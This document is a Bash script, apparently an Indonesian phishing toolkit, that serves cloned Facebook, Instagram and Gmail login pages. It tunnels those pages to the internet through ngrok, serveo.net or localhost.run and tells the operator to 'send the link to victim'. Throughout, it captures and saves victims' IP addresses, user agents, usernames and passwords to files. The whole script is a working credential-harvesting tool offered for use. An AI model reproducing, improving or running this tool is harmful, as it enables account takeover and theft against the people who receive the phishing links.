trap 'printf "\n";stop;exit 1' 2
deps() {
command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
}
banner() {
clear
printf "\e[0m\n"
echo "
╔═══╗╔╗─╔╗╔══╗╔═══╗╔╗─╔╗
║╔═╗║║║─║║╚╣─╝║╔═╗║║║─║║
║╚═╝║║╚═╝║─║║─║╚══╗║╚═╝║
║╔══╝║╔═╗║─║║─╚══╗║║╔═╗║
║║───║║─║║╔╣─╗║╚═╝║║║─║║
╚╝───╚╝─╚╝╚══╝╚═══╝╚╝─╚╝

Created By Tegar ID

Dunia Kode Comunity"

printf " \n"
}
menu() {
printf "\e[0m\n"
printf "[1] Facebook\n[2] Instagram\n[3] Gmail\n"
read -p $'Pilih Jenis Phising: ' option
if [[ $option == 1 || $option == 01 ]]; then
facebook
elif [[ $option == 2 || $option == 02 ]]; then
instagram
elif [[ $option == 3 || $option == 03 ]]; then
gmail
else
printf "Pilihan Tidak Sesuai!!\n"
sleep 1
banner
menu
fi
}
facebook(){
printf " \n"
printf " [1] Halaman Login Tradisional\n"
printf " [3] Halaman Login Jajak Pendapat Pemungutan Suara\n"
printf " [4] Halaman Login Keamanan Palsu\n"
printf " [5] Halaman Login Facebook Messenger\n"
printf "\e[0m\n"
read -p $'Pilih Metode Phising : ' option
if [[ $option == 1 || $option == 01 ]]; then
server="facebook"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="fb_advanced"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="fb_security"
start
elif [[ $option == 4 || $option == 04 ]]; then
server="fb_messenger"
start
else
printf "Menu Tidak Ada!!"
sleep 1
banner
menu
fi
}
instagram(){
printf " \n"
printf "[1] Halaman Login Tradisional\n"
printf "[2] Halaman Login Auto Follower\n"
printf "[3] Halaman Login Verifikasi Lencana Biru\n"
printf "\e[0m\n"
read -p $'Pilih Metode Phising : ' option
if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="ig_followers"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="ig_verify"
start
else
printf "Menu Tidak Ada!!\n"
sleep 1
banner
menu
fi
}
gmail(){
printf " \n"
printf "[1] Halaman Login Pemulihan Gmail Lama\n"
printf "[2] Halaman Login Gmail Baru\n"
printf "[3] Polling Voting\n"
printf "\e[0m\n"
read -p $'Pilih Metode Phising : ' option
if [[ $option == 1 || $option == 01 ]]; then
server="google"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="google_new"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="google_poll"
start
else
printf "Menu Tidak Ada!!\n"
sleep 1
banner
menu
fi
}
stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e linksender ]]; then
rm -rf linksender
fi
}
start() {
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf "\n"
printf "[1] LocalHost\n"
printf "[2] Ngrok.io\n"
printf "[3] Serveo.net\n"
printf "[4] Localhost.run\b"
d_o_server="2"
printf "\n"
read -p $'Pilih Opsi Port : ' option_server
option_server="${option_server:-${d_o_server}}"
if [[ $option_server == 3 || $option_server == 03 ]]; then
start_s
elif [[ $option_server == 2 || $option_server == 02 ]]; then
start_n
elif [[ $option_server == 4 || $option_server == 04 ]]; then
start_local
elif [[ $option_server == 1 || $option_server == 01 ]]; then
start_l
else
printf "Pilihan Tidak Tersedia!!\n"
sleep 1
banner
start
fi
}
start_s() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt
fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt
fi
def_port="5555"
printf "\e[0m\n"
printf 'Masukan Port (Default: %s ): ' $def_port
read port
port="${port:-${def_port}}"
start_serveo
}
start_serveo() {
printf "\e[0m\n"
printf "Initializing...(localhost:$port)\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf "Launching Serveo ..\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > linksender ' &
printf "\n"
sleep 7
send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
printf "\n"
printf 'Send the link to victim : %s \n' $send_url
printf "\n"
found
}
start_n() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt
fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt
fi
if [[ -e ngrok ]]; then
echo ""
else
printf "\e[0m\n"
printf "Initializing...(localhost:5555)\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "Error! Install Dulu Semua Package.\n"
exit 1
fi
else
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "Error! Install Dulu Semua Package.\n"
exit 1
fi
fi
fi
printf "\e[0m\n"
printf "Launching Ngrok ..\n"
cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 2
./ngrok http 5555 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "Send the link to victim : %s \n" $link
found
}
start_local(){
def_port="5555"
printf "\e[0m\n"
printf 'Masukan Port (Default: %s ): ' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf "Initializing...(localhost:$port)\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf "Launching LocalHostRun ..\n"
printf "\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf "Ctrl + C to view Login Info.Press it After the Victim Opened It.\n"
printf "\e[1;93m\n"
ssh -R 80:localhost:$port ssh.localhost.run 2>&1
printf "\e[0m\n"
printf "\n"
printf "Login Info..\n"
while [ true ]; do
if [[ -e "websites/$server/ip.txt" ]]; then
c_ip
rm -rf websites/$server/ip.txt
fi
sleep 0.75
if [[ -e "websites/$server/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
printf "Akunnya cuk: %s" $account
printf "Password: %s" $password
cat websites/$server/usernames.txt >> websites/$server/login_info.txt
printf "\e[0m\n"
printf "Saved: websites/%s/login_info.txt\n" $server
printf "\n"
printf "Tekan Ctrl + C untuk keluar.\n"
rm -rf websites/$server/usernames.txt
fi
sleep 0.75
done
}
start_l() {
def_port="5555"
printf "\e[0m\n"
printf 'Masukan Port (Default: %s ): ' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf "Initializing...(localhost:$port)\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf "Successfully Hosted at : http://localhost:$port\n"
printf "\n"
found
}
found() {
printf "\n"
printf "Tunggu Info Login, Ctrl + C Untuk Keluar.\n"
printf "\n"
while [ true ]; do
if [[ -e "websites/$server/ip.txt" ]]; then
printf "\n"
printf "Victim IP Found!\n"
printf "\n"
c_ip
rm -rf websites/$server/ip.txt
fi
sleep 0.75
if [[ -e "websites/$server/usernames.txt" ]]; then
printf "Login info Found !!\n"
printf "\n"
c_cred
rm -rf websites/$server/usernames.txt
fi
sleep 0.75
done
}
c_ip() {
touch websites/$server/login_info.txt
ip=$(grep -a 'IP:' websites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' websites/$server/ip.txt | cut -d '"' -f2)
printf "Victim IP: %s\n" $ip
printf "\e[0m\n"
printf "Saved: websites/%s/victim_ip.txt\n" $server
printf "\n"
cat websites/$server/ip.txt >> websites/$server/victim_ip.txt
}
c_cred() {
account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
printf "Akunnya Cuk: %s\n" $account
printf "Password: %s\n" $password
cat websites/$server/usernames.txt >> websites/$server/login_info.txt
printf "\e[0m\n"
printf "Saved: websites/%s/login_info.txt\n" $server
printf "\n"
printf "Tunggu Info Login, Ctrl + C Untuk Keluar.\n"
}
zip websites.zip
banner
deps
menu
